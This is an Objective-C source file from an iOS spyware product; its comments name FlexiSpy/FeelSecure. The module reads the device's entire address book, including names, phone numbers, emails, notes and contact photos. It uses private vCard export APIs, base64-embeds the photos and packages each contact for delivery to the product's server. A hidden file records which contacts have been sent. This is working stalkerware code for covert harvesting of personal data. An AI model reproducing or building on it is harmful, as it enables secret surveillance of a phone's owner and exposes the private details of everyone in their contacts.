//
//  AddressbookDataProvider.m
//  AddressbookManager
//
//  Created by Makara Khloth on 2/9/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "AddressbookDataProvider.h"
#import "AddressbookRepository.h"
#import "SendAddressBook.h"
#import "SendAddressBookForApproval.h"
#import "AddressBook.h"
#import "FxVCard.h"
#import "FxContact.h"
#import "AddressbookUtils.h"
#import "Base64.h"

#import "ABVCardExporter.h"
#import "ABVCardRecord.h"
#import "AddressBook-Private.h"

#import "DefStd.h"
#import "DaemonPrivateHome.h"

#import <AddressBook/ABRecord.h>

@interface AddressbookDataProvider (private)

- (NSInteger) numberOfvCard;
- (NSString *) fromCFStringRef: (CFStringRef) aCFStringRef;
- (NSData *) fromCFDataRef: (CFDataRef) aCFDataRef;

- (NSString *) deliveredContactIDsPath;
- (void) saveDeliveredContactIDs: (NSArray *) aContactIDs;
- (NSArray *) loadDeliveredContactIDs;

@end

@implementation AddressbookDataProvider

@synthesize mSendAddressbookForApproval;
@synthesize mAddressbookRepository;

@synthesize mDeliverClientIDs;

- (id) init {
	if ((self = [super init])) {
		mVCardIndex = 0;
		mDeliverClientIDs = [[NSMutableArray alloc] initWithArray:[self loadDeliveredContactIDs]];
	}
	return (self);
}

- (id) commandDataAllForApproval: (BOOL) aSendAddressbookForApproval {
	DLog(@"aSendAddressbookForApproval = %d", aSendAddressbookForApproval)
	[self setMSendAddressbookForApproval:aSendAddressbookForApproval];
	id sendAddressbook = nil;
	if (aSendAddressbookForApproval) {
		sendAddressbook = [[SendAddressBookForApproval alloc] init];
		// Delete all contact ids that were delivered previously
		[mDeliverClientIDs removeAllObjects];
	} else {
		sendAddressbook = [[SendAddressBook alloc] init];
	}
	mVCardIndex = 0;
	NSMutableArray *array = [NSMutableArray array];
	AddressBook *addressbook = [[AddressBook alloc] init];
	[addressbook setVCardCount:[self numberOfvCard]];
	[addressbook setAddressBookID:1];
	[addressbook setAddressBookName:@"iPhone-Address book"];
	[addressbook setVCardProvider:self];
	[array addObject:addressbook];
	[addressbook release];
	[sendAddressbook setAddressBookList:array];
	[sendAddressbook autorelease];
	DLog(@"mNumberOfContact = %ld", (long)mNumberOfContact)
	return (sendAddressbook);
}

- (id) getObject {
	DLog(@"getObject")
	ABAddressBookRef addressbook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	CFArrayRef contactArray = ABAddressBookCopyArrayOfAllPeople(addressbook);
	CFIndex count = CFArrayGetCount(contactArray);
	ABRecordRef abRecord = nil;
	BOOL explicitlyCreateRecord = NO;
	
	// To prevent the case where user delete contacts while feelsecure/flexispy deliver contacts to server
	if (mVCardIndex < count) {
		abRecord = CFArrayGetValueAtIndex(contactArray, mVCardIndex);
	} else {
		// IMPROVEMENT: should try to get from address book of feelsecure, but we need to provide contact ids in case of sending for approval,
		// in order to find its associate client id in feelsecure address book
		
		abRecord = ABPersonCreate(); // Create empty contact
		explicitlyCreateRecord = YES;
	}
	
	// Server ID
	NSInteger serverID = 0;
	
	// Client ID
	CFDateRef cfDate = ABRecordCopyValue(abRecord, kABPersonCreationDateProperty);
	NSString *clientID = [(NSDate *)cfDate description];
	if (cfDate) CFRelease(cfDate);
	if ([self mSendAddressbookForApproval]) {
		//  Client id must exist, mean before send for approval contact must exist in fscontact.db
		ABRecordID recordID = ABRecordGetRecordID(abRecord);
		FxContact *contact = [[self mAddressbookRepository] selectAddressbookContactID:recordID];
		if (contact == nil) { // Add new contact while sending undefined contact status to server
			contact = [AddressbookUtils contactFromABRecord:abRecord];
			//[contact setMApprovedStatus:kUndefineContactStatus];
			[contact setMApprovedStatus:kWaitingForApprovalContactStatus]; // The sending some contact for approval provider will mark ' X' but not here
			[[self mAddressbookRepository] insert:[NSArray arrayWithObject:contact]]; // Up on completed client id will be assigned
		}
		serverID = [contact mServerID];
		clientID = [NSString stringWithFormat:@"%d", [contact mClientID]];
		[mDeliverClientIDs addObject:[NSNumber numberWithInt:[contact mClientID]]];
	}
	
	// Remove emoji from full name (notification is made since there is no changes is saved)
	[AddressbookUtils removeEmojiFromFullNameNote:abRecord];
	
	// First name
	CFStringRef cfString = ABRecordCopyValue(abRecord, kABPersonFirstNameProperty);
	NSString *firstName = [self fromCFStringRef:cfString];
	if (cfString) CFRelease(cfString);
	
	// Last name
	cfString = ABRecordCopyValue(abRecord, kABPersonLastNameProperty);
	NSString *lastName = [self fromCFStringRef:cfString];
	if (cfString) CFRelease(cfString);
	
	// Mobile, home, work phone
	NSString *mobilePhone, *homePhone, *workPhone;
	mobilePhone = homePhone = workPhone = nil;
	ABMultiValueRef phones = ABRecordCopyValue(abRecord, kABPersonPhoneProperty);
	for (CFIndex i = 0; (phones && i < ABMultiValueGetCount(phones)); i++) {
		CFStringRef phoneLabel = ABMultiValueCopyLabelAtIndex(phones, i);
		CFStringRef phoneValue = ABMultiValueCopyValueAtIndex(phones, i);
		DLog(@"phoneLabel=%@, phoneValue=%@", phoneLabel, phoneValue)
		DLog(@"kABPersonPhoneMobileLabel=%@, kABHomeLabel=%@, kABWorkLabel=%@", kABPersonPhoneMobileLabel, kABHomeLabel, kABWorkLabel)
		if (phoneLabel) {
			if (!mobilePhone && CFStringCompare(phoneLabel, kABPersonPhoneMobileLabel, kCFCompareForcedOrdering) == kCFCompareEqualTo) {
				mobilePhone = [self fromCFStringRef:phoneValue];
			}
			if (!homePhone && CFStringCompare(phoneLabel, kABHomeLabel, kCFCompareForcedOrdering) == kCFCompareEqualTo) {
				homePhone = [self fromCFStringRef:phoneValue];
			}
			if (!workPhone && CFStringCompare(phoneLabel, kABWorkLabel, kCFCompareForcedOrdering) == kCFCompareEqualTo) {
				workPhone = [self fromCFStringRef:phoneValue];
			}
		} else { // Pla's issue contact sync from Yahoo mail have no label (label = nil) then cause CFStringCompare crash with signal 11
			DLog (@"phoneLable is nil------------")
			if (!mobilePhone) {
				mobilePhone = [self fromCFStringRef:phoneValue];
			}
			if (!homePhone) {
				homePhone = [self fromCFStringRef:phoneValue];
			}
			if (!workPhone) {
				workPhone = [self fromCFStringRef:phoneValue];
			}
		}

		if (phoneLabel) CFRelease(phoneLabel);
		if (phoneValue) CFRelease(phoneValue);
	}
	if (phones) CFRelease(phones);
	
	// Email
	NSString *email = nil;
	ABMultiValueRef emails = ABRecordCopyValue(abRecord, kABPersonEmailProperty);
	if (emails && ABMultiValueGetCount(emails)) {
		cfString = ABMultiValueCopyValueAtIndex(emails, 0);
		email = [self fromCFStringRef:cfString];
		if (cfString) CFRelease(cfString);
	}
	if (emails) CFRelease(emails);
	
	// Note
	cfString = ABRecordCopyValue(abRecord, kABPersonNoteProperty);
	NSString *note = [self fromCFStringRef:cfString];
	if (cfString) CFRelease(cfString);
	
	ABVCardRecord* abVcardRecord = [[ABVCardRecord alloc] initWithRecord:(void *)abRecord];
	
	// Picture
	// Method 1
	//CFDataRef cfData = ABPersonCopyImageData(abRecord);
	//NSData *picture = [self fromCFDataRef:cfData];
	//if (cfData) CFRelease(cfData);
	// Method 2
	NSData *picture = [abVcardRecord imageData];
	
	/*
	 API to export vCard 2.1 not include photo but API to export 3.0 include
	 */
	
	// Vcard data
	[ABVCardRecord setIncludeNotesInVCards:TRUE];
	//[ABVCardRecord setIncludePhotosInVCards:TRUE];
	
	// Method 1 --> How to set enable picture and note like method 2?
	NSData *vcardData = [ABVCardExporter _vCard21RepresentationOfRecords:[NSArray arrayWithObject:(id)abRecord]];
	//NSData *vcardData = [ABVCardExporter _vCard30RepresentationOfRecords:[NSArray arrayWithObject:(id)abRecord]];
	
	// Method 2
//	NSData *vcardData = [abVcardRecord _21vCardRepresentationAsData];
	
	[abVcardRecord release];
	
	// ******************** VCARD photo work around ***************
	if ([picture length]) {
		[Base64 initialize];
		NSString *base64 = [Base64 encode:picture];
		//DLog(@"base64 string from picture = %@", base64);
		
		NSString *photo = [NSString stringWithFormat:@"PHOTO;ENCODING=BASE64;TYPE=JPEG:%@ \n\nEND:VCARD", base64];
		NSString *vCard = [[[NSString alloc] initWithData:vcardData encoding:NSUTF8StringEncoding] autorelease];
		vCard = [vCard stringByReplacingOccurrencesOfString:@"END:VCARD" withString:photo];
		vcardData = [vCard dataUsingEncoding:NSUTF8StringEncoding];
	}
	
	// ******************** VCARD photo ***************
	
	if (explicitlyCreateRecord) {
		CFRelease(abRecord);
	}
	CFRelease(contactArray);
	CFRelease(addressbook);
	
//	DLog(@"clientID=%@", clientID)
//	DLog(@"firstName=%@, lastName=%@", firstName, lastName)
//	DLog(@"mobilePhone=%@, homePhone=%@, workPhone=%@", mobilePhone, homePhone, workPhone)
//	DLog(@"email=%@, note=%@", email, note)
//	DLog(@"picture's length=%d, picture=%@", [picture length], picture)
//	DLog(@"vcardData's length=%d, vcardData=%@", [vcardData length], vcardData)
//	DLog(@"vcardData to string=%@", [[[NSString alloc] initWithData:vcardData encoding:NSUTF8StringEncoding] autorelease]);
	
	FxVCard *vcard = [[FxVCard alloc] init];
	if ([self mSendAddressbookForApproval]) {
		[vcard setApprovalStatus:AWAITING_APPROVAL];
	} else {
		[vcard setApprovalStatus:NO_STATUS];
	}

	[vcard setCardIDClient:clientID];
	[vcard setCardIDServer:serverID];
	[vcard setFirstName:firstName];
	[vcard setLastName:lastName];
	[vcard setMobilePhone:mobilePhone];
	[vcard setHomePhone:homePhone];
	[vcard setWorkPhone:workPhone];
	[vcard setEmail:email];
	[vcard setNote:note];
	[vcard setContactPicture:picture];
	[vcard setVCardData:vcardData];
	[vcard autorelease];
	
	mVCardIndex++;
	return (vcard);
}

- (BOOL) hasNext {
	BOOL hasNext = (mVCardIndex < mNumberOfContact);
	DLog(@"hasNext=%d", hasNext)
	if (!hasNext && [self mSendAddressbookForApproval]) {
		[self saveDeliveredContactIDs:mDeliverClientIDs];
	}
	return (hasNext);
}

- (NSInteger) numberOfvCard {
	// Will return -1 if the privacy db (/var/mobile/Library/TCC/TCC.db) does not include bundle identifer of this application
	ABAddressBookRef addressbook = ABAddressBookCreateWithDatabaseDirectory((CFStringRef)kUIAddressBookFolder);
	mNumberOfContact = ABAddressBookGetPersonCount(addressbook);
	CFRelease(addressbook);
	return (mNumberOfContact);
}

- (NSString *) fromCFStringRef: (CFStringRef) aCFStringRef {
	if (aCFStringRef) {
		return ([NSString stringWithString:(NSString *)aCFStringRef]);
	} else {
		return ([NSString string]);
	}
}

- (NSData *) fromCFDataRef: (CFDataRef) aCFDataRef {
	if (aCFDataRef) {
		return ([NSData dataWithData:(NSData *)aCFDataRef]);
	} else {
		return ([NSData data]);
	}
}

- (NSString *) deliveredContactIDsPath {
	NSString *privateHome = [DaemonPrivateHome daemonPrivateHome];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:[privateHome stringByAppendingString:@"abm/"]];
	NSString *contactIDsPath = [NSString stringWithFormat:@"%@abm/%@", privateHome, @"contactids1.dat"];
	return (contactIDsPath);
}

- (void) saveDeliveredContactIDs: (NSArray *) aContactIDs {
	NSMutableData* rawData = [[NSMutableData alloc] init];   
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:rawData];
	[archiver encodeObject:aContactIDs forKey:@"deliver-contact-ids"];
	[archiver finishEncoding];
	[rawData writeToFile:[self deliveredContactIDsPath] atomically:YES];
	[archiver release];
	[rawData release];
}

- (NSArray *) loadDeliveredContactIDs {
	NSArray *contactIDs = [NSArray array];
	NSFileManager *fm = [NSFileManager defaultManager];
	if ([fm fileExistsAtPath:[self deliveredContactIDsPath]]) {
		NSData *rawData = [NSData dataWithContentsOfFile:[self deliveredContactIDsPath]];
		NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:rawData];
		contactIDs = [unarchiver decodeObjectForKey:@"deliver-contact-ids"];
		[unarchiver release];
	}
	return (contactIDs);
}

- (void) dealloc {
	[mDeliverClientIDs release];
	[super dealloc];
}

@end
